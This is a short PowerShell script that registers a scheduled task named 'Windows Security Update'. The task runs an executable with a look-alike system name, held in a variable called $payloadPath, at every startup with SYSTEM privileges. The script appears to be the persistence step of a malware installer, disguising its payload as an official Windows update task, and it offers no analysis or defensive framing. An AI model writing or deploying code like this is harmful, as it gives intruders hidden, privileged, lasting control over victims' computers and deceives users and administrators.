$taskName    = "Windows Security Update"
$payloadPath = "$PSScriptRoot\sindowsyssecurity.exe"

$action   = New-ScheduledTaskAction -Execute $payloadPath
$trigger  = New-ScheduledTaskTrigger -AtStartup

$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -RunLevel Highest

Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force
